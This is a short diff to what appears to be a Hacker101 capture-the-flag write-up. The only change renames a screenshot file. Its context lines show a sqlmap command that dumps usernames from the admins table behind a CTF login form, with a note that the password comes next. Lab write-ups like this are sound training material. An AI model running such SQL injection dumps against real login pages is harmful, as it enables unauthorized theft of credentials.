@@ -59,7 +59,7 @@ Now let's have a look at the usernames! Dump it!
 ```bash
 sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C username --dump
 ```
-![sqlmap_usernames](sqlmap_usernames.png)
+![sqlmap_usernames](sqlmap_username.png)
 
 Now let's retrieve the password.
 
